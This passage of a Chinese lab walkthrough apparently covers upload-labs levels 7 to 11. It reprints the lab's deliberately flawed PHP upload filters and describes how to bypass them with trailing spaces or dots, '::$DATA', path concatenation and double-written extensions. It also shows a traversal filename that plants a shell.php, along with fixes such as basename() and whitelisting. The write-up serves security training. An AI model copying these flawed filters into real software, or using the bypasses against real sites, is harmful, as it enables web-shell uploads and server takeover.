class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).<span class="hljs-variable">$file_ext</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件不允许上传&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>抓包加空格</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021932479.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021932081.png"></p><h3 id="Pass-08-点绕过"><a href="#Pass-08-点绕过" class="headerlink" title="Pass-08_点绕过"></a>Pass-08_点绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//首尾去空</span><br>        <br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>加点</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021933068.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021932765.png"></p><h3 id="Pass-09-DATA绕过"><a href="#Pass-09-DATA绕过" class="headerlink" title="Pass-09_::$DATA绕过"></a>Pass-09_<code>::$DATA</code>绕过</h3><p>原理:Windows系统下，如果上传的文件名是<code>test.php::$DATA</code>，会在服务器上生成一个<code>test.php</code>的文件，其中内容和所上传文件内容相同。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">deldot</span>(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//首尾去空</span><br>        <br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).<span class="hljs-variable">$file_ext</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到这一关少了前几关中的<code> $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA</code>，所以可以使用<code>::$DATA</code>绕过</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021937853.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021937320.png" alt="null"></p><h3 id="Pass-10-拼接路径"><a href="#Pass-10-拼接路径" class="headerlink" title="Pass-10-拼接路径"></a>Pass-10-拼接路径</h3><p>源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">deldot</span>(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<span class="hljs-comment">//获取文件扩展名</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//首尾去空</span><br>        <br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;<span class="hljs-comment">//拼接上传路径和文件名</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<span class="hljs-comment">//将临时文件移动到目标路径</span><br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>拼接路径原理解释：</strong></p><p><strong>举个生活化的例子：</strong></p><p>假设你有一个快递柜（上传目录），地址是 <code>/小区A/3号楼/快递柜/</code>。<br>你规定所有快递必须放进这个柜子里。</p><p>但攻击者耍了个花招：<br>他们在快递单上写 <code>../../小区大门/保安室/危险包裹</code>。<br>快递员（代码）看到这个地址后，会这样拼接路径：<code>/小区A/3号楼/快递柜/../../小区大门/保安室/危险包裹</code></p><p>这里的 <code>../</code> 相当于“后退一步”：</p><ol><li>从 <code>快递柜</code> 退到 <code>3号楼</code>（路径变成 <code>/小区A/3号楼/</code>）</li><li>再退到 <code>小区A</code>（路径变成 <code>/小区A/</code>）</li><li>最后拼上 <code>小区大门/保安室/危险包裹</code>，结果就是：<br><code>/小区A/小区大门/保安室/危险包裹</code></li></ol><p>于是，攻击者的危险包裹被放到了保安室（敏感目录），而不是快递柜！</p><hr><p><strong>为什么会有这种问题？</strong></p><ol><li><strong>代码的路径拼接逻辑</strong>：<br>你的代码直接信任用户输入的文件名，把上传目录（<code>UPLOAD_PATH</code>）和文件名（<code>$file_name</code>）拼在一起。<br>如果文件名里藏了 <code>../</code>，路径就会被“绕”到其他目录。</li><li><strong>操作系统对路径的解析</strong>：<br>操作系统会自动解析 <code>../</code>，把它当成“返回上级目录”的指令。<br>比如：<br><code>/var/www/uploads/../../</code> → 实际上等于 <code>/var/</code>（退了两层）</li></ol><hr><p><strong>攻击者会做什么？</strong></p><p>假设你的网站根目录是 <code>/var/www/html/</code>，攻击者可能：</p><ol><li>上传一个文件名 <code>../../html/shell.php</code></li><li>你的代码拼接后路径变成：<br><code>/var/www/uploads/../../html/shell.php</code> → 实际是 <code>/var/www/html/shell.php</code></li><li>攻击者通过访问 <code>http://你的网站.com/shell.php</code>，就能执行任意代码（比如删除数据库、窃取数据）。</li></ol><hr><p><strong>如何彻底解决？</strong></p><ol><li><strong>禁止文件名中出现路径符号</strong>：<br>用 <code>basename()</code> 函数，直接砍掉所有路径部分，只保留纯文件名。</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]); <span class="hljs-comment">// 无论用户输入什么路径，只取最后的文件名</span><br></code></pre></td></tr></table></figure><p><strong>效果</strong>：</p><pre><code class="hljs">- 用户输入 `../../evil.php` → 处理后变成 `evil.php`- 路径固定为 `UPLOAD_PATH/evil.php`</code></pre><ol start="2"><li><strong>强制白名单文件类型</strong>：<br>只允许图片等安全类型（比如 <code>.jpg</code>, <code>.png</code>），禁止 <code>.php</code> 等可执行文件。</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$allow_ext</span> = [<span class="hljs-string">&#x27;.jpg&#x27;</span>, <span class="hljs-string">&#x27;.png&#x27;</span>, <span class="hljs-string">&#x27;.gif&#x27;</span>]; <span class="hljs-comment">// 只允许这些扩展名</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$allow_ext</span>)) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;禁止上传！&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><ol start="3"><li><strong>重命名上传的文件</strong>：<br>用随机字符串重命名文件（如 <code>5f3d2a1.jpg</code>），让攻击者无法预测文件路径。</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$new_name</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">uniqid</span>()) . <span class="hljs-variable">$file_ext</span>; <span class="hljs-comment">// 生成随机文件名</span><br><span class="hljs-variable">$img_path</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$new_name</span>;<br></code></pre></td></tr></table></figure><p>拼接路径，在文件名称后面加入<code>. .</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021938448.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021938522.png"></p><h3 id="Pass-11-双写绕过"><a href="#Pass-11-双写绕过" class="headerlink" title="Pass-11_双写绕过"></a>Pass-11_双写绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;php&quot;</span>,<span class="hljs-string">&quot;php5&quot;</span>,<span class="hljs-string">&quot;php4&quot;</span>,<span class="hljs-string">&quot;php3&quot;</span>,<span class="hljs-string">&quot;php2&quot;</span>,<span class="hljs-string">&quot;html&quot;</span>,<span class="hljs-string">&quot;htm&quot;</span>,<span class="hljs-string">&quot;phtml&quot;</span>,<span class="hljs-string">&quot;pht&quot;</span>,<span class="hljs-string">&quot;jsp&quot;</span>,<span class="hljs-string">&quot;jspa&quot;</span>,<span class="hljs-string">&quot;jspx&quot;</span>,<span class="hljs-string">&quot;jsw&quot;</span>,<span class="hljs-string">&quot;jsv&quot;</span>,<span class="hljs-string">&quot;jspf&quot;</span>,<span class="hljs-string">&quot;jtml&quot;</span>,<span class="hljs-string">&quot;asp&quot;</span>,<span class="hljs-string">&quot;aspx&quot;</span>,<span class="hljs-string">&quot;asa&quot;</span>,<span class="hljs-string">&quot;asax&quot;</span>,<span class="hljs-string">&quot;ascx&quot;</span>,<span class="hljs-string">&quot;ashx&quot;</span>,<span class="hljs-string">&quot;asmx&quot;</span>,<span class="hljs-string">&quot;cer&quot;</span>,<span class="hljs-string">&quot;swf&quot;</span>,<span class="hljs-string">&quot;htaccess&quot;</span>,<span class="hljs-string">&quot;ini&quot;</span>);<br><br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-variable">$deny_ext</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$file_name</span>);<br>        <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>        <span 